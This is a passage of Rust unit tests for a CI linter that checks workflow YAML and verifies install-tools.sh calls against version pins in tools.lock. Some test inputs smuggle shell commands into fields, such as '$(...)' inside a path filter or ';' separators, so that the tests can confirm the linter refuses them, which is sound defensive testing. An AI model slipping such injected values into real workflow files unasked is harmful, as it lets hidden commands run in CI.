        assert_eq!(check_workflow(&ok), Vec::<String>::new());
        let dotted = good().replacen(
            "    permissions:",
            "    cargo.version: x\n    permissions:",
            1,
        );
        assert_eq!(check_workflow(&dotted), Vec::<String>::new());
        // Lines outside it: quoted or odd keys, two dots, explicit keys, documents, directives,
        // a block scalar as a list item, a deeper line after a scalar.
        for (from, to) in [
            ("    permissions:", "    \"permissions\":"),
            ("    permissions:", "    'permissions':"),
            ("    permissions:", "    a.b.c: x\n    permissions:"),
            ("    permissions:", "    ? permissions\n    permissions:"),
            ("jobs:", "---\njobs:"),
            ("jobs:", "jobs:\n..."),
            ("on:", "%YAML 1.2\non:"),
            ("on:", "---\non:"),
            (
                "          echo \"$TITLE\"",
                "          echo \"$TITLE\"\n      - |\n        echo hi",
            ),
            (
                "    permissions:",
                "    steps2: x\n      deeper: y\n    permissions:",
            ),
            (
                "    permissions:",
                "    steps2: x\n      - deeper\n    permissions:",
            ),
            (
                "    permissions:",
                "    steps2:\n      - scalar\n        deeper: y\n    permissions:",
            ),
        ] {
            let text = good().replacen(from, to, 1);
            assert_ne!(text, good(), "{to}");
            assert!(!check_workflow(&text).is_empty(), "accepted: {to}");
        }
    }

    /// Review of #101: a continuation `\` lost in two messages left a literal `\n` and spaces.
    #[test]
    fn messages_have_no_literal_line_break() {
        let events = check_workflow(&with_on("on: issues\n"));
        let none = check_workflow(&good().replacen("on:\n  pull_request:\n", "", 1));
        for e in events.iter().chain(&none) {
            assert!(!e.contains("\\n") && !e.contains("  "), "{e}");
        }
        assert!(!events.is_empty() && !none.is_empty());
    }

    const SCRIPT: &str = include_str!("../../ci/install-tools.sh");
    const LOCK: &str = include_str!("../../dev/tools.lock");

    fn repo_workflows() -> Vec<(String, String)> {
        vec![
            (
                "ci.yml".into(),
                include_str!("../../../.github/workflows/ci.yml").into(),
            ),
            (
                "nightly.yml".into(),
                include_str!("../../../.github/workflows/nightly.yml").into(),
            ),
        ]
    }

    /// A test script: the installer's `lock_value`, then `rest`.
    fn with_reader(rest: &str) -> String {
        format!(
            "lock_value() {{\n  {}\n}}\n{rest}",
            LOCK_VALUE_BODY.join("\n  ")
        )
    }

    fn keys_of(script: &str, sub: &str) -> Option<Result<Reads, String>> {
        let keys = installer_keys(script);
        keys.into_iter().find(|(s, _)| s == sub).map(|(_, k)| k)
    }

    fn owned(keys: &[&str]) -> Option<Result<Reads, String>> {
        Some(Ok(Reads::Keys(
            keys.iter().map(|s| s.to_string()).collect(),
        )))
    }

    fn refusal(script: &str, sub: &str) -> String {
        match keys_of(script, sub) {
            Some(Err(e)) => e,
            other => panic!("{sub} accepted: {other:?}"),
        }
    }

    /// Errors of `run: <call>` in a one-step workflow.
    fn call_errors(call: &str, script: &str) -> Vec<String> {
        let flow = vec![(
            "w.yml".to_owned(),
            format!("    steps:\n      - run: {call}\n"),
        )];
        tool_lock_errors(&flow, script, LOCK)
    }

    #[test]
    fn reads_lock_values_like_the_installer() {
        let lock = "# a.version = \"1\"\n a.version = \"2\"\na.versionx = \"3\"\nb.version = \"\"\n\
                    c.version=\"4\"\nc.version = \"5\"\nd.version = 6\ne.version  =  \"7\" # \"x\"\n";
        assert_eq!(
            sh_lock_value(lock, "a.version"),
            None,
            "comment, indent, prefix"
        );
        assert_eq!(sh_lock_value(lock, "b.version"), None, "empty");
        assert_eq!(
            sh_lock_value(lock, "c.version"),
            Some("4"),
            "first line wins"
        );
        assert_eq!(sh_lock_value(lock, "d.version"), None, "unquoted");
        assert_eq!(
            sh_lock_value(lock, "e.version"),
            Some("7\" # \"x"),
            "greedy, as sed"
        );
    }

    #[test]
    fn maps_installer_subcommands_to_their_keys() {
        let of = |sub: &str| keys_of(SCRIPT, sub);
        assert_eq!(of("rust"), owned(&[]));
        assert_eq!(of("cargo-fuzz"), owned(&["cargo-fuzz.version"]));
        assert_eq!(of("cargo-audit"), owned(&["cargo-audit.version"]));
        let Some(Ok(Reads::Keys(gitleaks))) = of("gitleaks") else {
            panic!("gitleaks: {:?}", of("gitleaks"));
        };
        assert!(gitleaks.contains(&"gitleaks.linux.sha256".to_owned()));
        assert!(gitleaks.contains(&"gitleaks.version".to_owned()));
        assert_eq!(of("gitleaks-selftest"), owned(&["gitleaks.linux.path"]));
        assert_eq!(of("version"), Some(Ok(Reads::ToolVersion)));
        // Nested `case` entries are not subcommands; alternations name each subcommand;
        // a helper's keys count, one-line helpers too; a missing function or a computed key
        // fails closed.
        let script = with_reader(
            "helper() {\n  lock_value 'h\\.version'\n}\nf() {\n  case $a in amd64) g ;; esac\n  helper\n  one\n}\n\
             one() { lock_value 'o\\.v'; }\nopaque() {\n  lock_value \"$1\\.version\"\n}\n\
             case ${1:-} in\n  a|b) f ;;\n  c) missing ;;\n  d) opaque ;;\nesac\n",
        );
        assert_eq!(keys_of(&script, "a"), owned(&["h.version", "o.v"]));
        assert_eq!(keys_of(&script, "b"), owned(&["h.version", "o.v"]));
        assert_eq!(keys_of(&script, "amd64"), None);
        assert!(refusal(&script, "c").contains("missing not found"));
        assert!(refusal(&script, "d").contains("not a single-quoted literal"));
        let stray = with_reader(
            "x=$(lock_value 'k\\.v')\nf() {\n  x\n}\ncase ${1:-} in\n  a) f ;;\nesac\n",
        );
        assert!(refusal(&stray, "a").contains("line 7 of the script calls lock_value outside"));
    }

    /// Review of #90, minor 1: a `-` in a function name is followed like any other character
    /// of a name, so its keys count.
    #[test]
    fn follows_helpers_with_a_dash() {
        let script = with_reader(
            "f() {\n  a-b x\n}\na-b() {\n  helper\n}\nhelper() {\n  lock_value 'h\\.v'\n}\n\
             case ${1:-} in\n  s) f ;;\nesac\n",
        );
        assert_eq!(keys_of(&script, "s"), owned(&["h.v"]));
    }

    /// Review of #90: what the check cannot read in the script is refused, not skipped.
    #[test]
    fn refuses_what_it_cannot_read_in_the_script() {
        let base = "f() {\n  lock_value 'a\\.b'\n}\ncase ${1:-} in\n  s) f ;;\nesac\n";
        assert_eq!(keys_of(&with_reader(base), "s"), owned(&["a.b"]));
        for (from, to, why) in [
            // Minor 2: a concatenated or unescaped key is not a literal.
            ("'a\\.b'", "'a\\.b'\"$X\"", "not a single-quoted literal"),
            ("'a\\.b'", "'a.b'", "not a single-quoted literal"),
            ("'a\\.b'", "'a\\.b'x", "not a single-quoted literal"),
            // Definitions the check would not follow.
            (
                "f() {",
                "function f {",
                "line 7 of the script defines a function",
            ),
            ("f() {", "f () {", "defines a function"),
            ("f() {", "f()\n{", "defines a function"),
            ("case", "a.b() {\n  :\n}\ncase", "defines a function"),
            ("case", "  g() { :; }\ncase", "defines a function"),
            ("case", "f() { :; }\ncase", "defines f twice"),
            ("\n}\n", "\n", "is not closed"),
            // Dispatcher: other subject, other entry form, entry after a glob.
            (
                "case ${1:-} in",
                "case ${2:-} in",
                "does not switch on the first argument",
            ),
            ("s) f ;;", "s)\n    f ;;", "neither"),
            ("s) f ;;", "s) f \"$@\" ;;", "is not `name) function ;;`"),
            ("s) f ;;", "s*) f ;;\n  s) f ;;", "follows the glob pattern"),
        ] {
            let script = with_reader(&base.replacen(from, to, 1));
            let e = refusal(&script, "s");
            assert!(e.contains(why), "{to}: {e}");
        }
    }

    /// Review of #90, important 2: the `version)` entry and `lock_value` are compared to the
    /// text this check mirrors; any change is refused.
    #[test]
    fn refuses_a_changed_reader() {
        let version = "lock_value \"$2\\.linux\\.version\")";
        let line = SCRIPT
            .lines()
            .find(|l| l.contains("v=$(lock_value"))
            .unwrap();
        for script in [
            SCRIPT.replace(line, &format!("    v=$({version}")),
            SCRIPT.replace("sed 's/\\./\\\\./g'", "sed 's/x/x/'"),
            SCRIPT.replace("head -n 1)", "tail -n 1)"),
        ] {
            assert_ne!(script, SCRIPT);
            let errors = call_errors(
                "bash tools/ci/install-tools.sh version cargo-audit",
                &script,
            );
            assert_eq!(errors.len(), 1, "{errors:?}");
            assert!(
                errors[0].contains("install-tools.sh version: "),
                "{errors:?}"
            );
        }
        let errors = call_errors(
            "bash tools/ci/install-tools.sh cargo-audit",
            &SCRIPT.replace("head -n 1)", "tail -n 1)"),
        );
        assert!(
            errors.len() == 1 && errors[0].contains("lock_value differs"),
            "{errors:?}"
        );
    }

    #[test]
    fn finds_installer_calls_only() {
        let args = |line| installer_calls(line);
        assert_eq!(args("run: bash tools/ci/install-tools.sh rust"), [["rust"]]);
        assert_eq!(
            args("tools/ci/install-tools.sh version cargo-audit"),
            [["version", "cargo-audit"]]
        );
        assert_eq!(
            args("bash -x \"tools/ci/install-tools.sh\" 'x'; echo"),
            [["x"]]
        );
        assert_eq!(args("a && bash ./install-tools.sh y && b"), [["y"]]);
        assert_eq!(
            args("bash tools/ci/install-tools.sh z # see the docs"),
            [["z"]]
        );
        for none in [
            "paths: ['tools/ci/install-tools.sh']",
            "  - 'tools/ci/install-tools.sh'",
            "echo \"install-tools.sh failed\"",
            "cat tools/ci/install-tools.sh",
            "run: $(tools/ci/install-tools.sh x)",
        ] {
            assert!(args(none).is_empty(), "{none}");
        }
    }

    /// Review of #90, important 1: a mention that is not a recognised call is refused, so that
    /// a call written in another form cannot skip the check (the failure of #75 itself).
    #[test]
    fn refuses_unrecognised_mentions() {
        for call in [
            "\"bash tools/ci/install-tools.sh cargo-fuzz\"",
            "'bash tools/ci/install-tools.sh cargo-fuzz'",
            "(bash tools/ci/install-tools.sh cargo-fuzz)",
            "echo $(bash tools/ci/install-tools.sh cargo-fuzz)",
            "true;bash tools/ci/install-tools.sh cargo-fuzz",
            "true&&bash tools/ci/install-tools.sh cargo-fuzz",
            ". tools/ci/install-tools.sh cargo-fuzz",
            "echo \"install-tools.sh failed\"",
            "bash tools/ci/install-tools.sh rust # see install-tools.sh",
            "bash tools/ci/install-tools.sh rust; bash tools/ci/install-tools.sh;",
            "s=tools/ci/install-tools.sh",
        ] {
            let errors = call_errors(call, SCRIPT);
            assert!(
                errors.len() == 1 && errors[0].contains("unrecognised mention of install-tools.sh"),
                "{call}: {errors:?}"
            );
        }
        // Path filters name the script without running it; a lookalike item does not pass.
        let filters = "on:\n  push:\n    paths: ['tools/ci/install-tools.sh', \"docs/**\"]\n  \
                       pull_request:\n    paths-ignore:\n      # pinned installer\n      \
                       - 'tools/ci/install-tools.sh'\n      - tools/**\n";
        let flow = vec![("w.yml".to_owned(), filters.to_owned())];
        assert_eq!(tool_lock_errors(&flow, SCRIPT, LOCK), Vec::<String>::new());
        for bad in [
            "    branches:\n      - 'tools/ci/install-tools.sh'\n",
            "    paths:\n      - x;tools/ci/install-tools.sh\n",
            "    paths: [x, $(bash tools/ci/install-tools.sh cargo-fuzz)]\n",
        ] {
            let flow = vec![("w.yml".to_owned(), format!("on:\n  push:\n{bad}"))];
            let errors = tool_lock_errors(&flow, SCRIPT, LOCK);
            assert_eq!(errors.len(), 1, "{bad}: {errors:?}");
        }
    }

    /// The repository's workflows pass the `workflows` step of `cargo xtask check`, among them the
    /// `report` job of nightly.yml that opens the nightly anomaly issue (AS-52).
    #[test]
    fn accepts_the_repository_workflows() {
        for (name, text) in repo_workflows() {
            assert_eq!(check_workflow(&text), Vec::<String>::new(), "{name}");
        }
    }

    /// #75: nightly.yml called `install-tools.sh cargo-fuzz` while tools.lock had no
    /// `cargo-fuzz.version`; the weekly fuzzing failed at run time instead of in the PR.
    #[test]
    fn refuses_an_installer_call_without_its_pin() {
        let flows = repo_workflows();
        assert_eq!(tool_lock_errors(&flows, SCRIPT, LOCK), Vec::<String>::new());
        let without: String = LOCK
            .lines()
            .filter(|l| !l.starts_with("cargo-fuzz.version"))
            .map(|l| format!("{l}\n"))
            .collect();
        for lock in [
            without.clone(),
            format!("{without}cargo-fuzz.version = \"\"\n"),
        ] {
            let errors = tool_lock_errors(&flows, SCRIPT, &lock);
            assert!(!errors.is_empty());
            assert!(
                errors.iter().all(|e| e.starts_with("nightly.yml : line ")
                    && e.contains("cargo-fuzz.version missing or empty")),
                "{errors:?}"
            );
        }
        // Every way of writing the call, recognised or not, is refused without the pin.
        let i = "bash tools/ci/install-tools.sh cargo-fuzz";
        for run in [
            i.to_owned(),
            format!("FOO=1 {i}"),
            format!("env FOO=1 {i}"),
            format!("timeout 600 {i}"),
            format!("bash -e {}", &i[5..]),
            format!("bash -c '{}'", &i[5..]),
            format!("|\n          {{ {i}; }}"),
            format!("|\n          if true; then {i}; fi"),
            format!(">\n          {i}"),
            format!(
                "|\n          {} \\\n            cargo-fuzz",
                &i[..i.len() - 11]
            ),
            "|\n          s=tools/ci/install-tools.sh\n          bash \"$s\" cargo-fuzz".to_owned(),
            format!("echo cargo-fuzz | xargs {}", &i[..i.len() - 11]),
        ] {
            let flow = vec![(
                "w.yml".to_owned(),
                format!("    steps:\n      - run: {run}\n"),
            )];
            assert!(
                !tool_lock_errors(&flow, SCRIPT, &without).is_empty(),
                "{run}"
            );
        }
        for (call, what) in [
            ("bash tools/ci/install-tools.sh maturin", "unknown"),
            ("bash ./tools/ci/install-tools.sh \"maturin\"", "unknown"),
            (
                "bash tools/ci/install-tools.sh version maturin",
                "maturin.version missing",
            ),
            (
                "bash tools/ci/install-tools.sh version \"$T\"",
                "literal tool name",
            ),
            (
                "bash tools/ci/install-tools.sh version a.*",
                "literal tool name",
            ),
            ("bash tools/ci/install-tools.sh", "without a subcommand"),
        ] {
            let errors = call_errors(call, SCRIPT);
            assert!(
                errors.len() == 1 && errors[0].contains(what),
                "{call}: {errors:?}"
            );
        }
        let comment = vec![(
            "w.yml".to_owned(),
            "# install-tools.sh maturin\n      - run: |\n          # bash install-tools.sh maturin\n"
                .to_owned(),
        )];
        assert_eq!(
            tool_lock_errors(&comment, SCRIPT, LOCK),
            Vec::<String>::new()
        );
    }
}
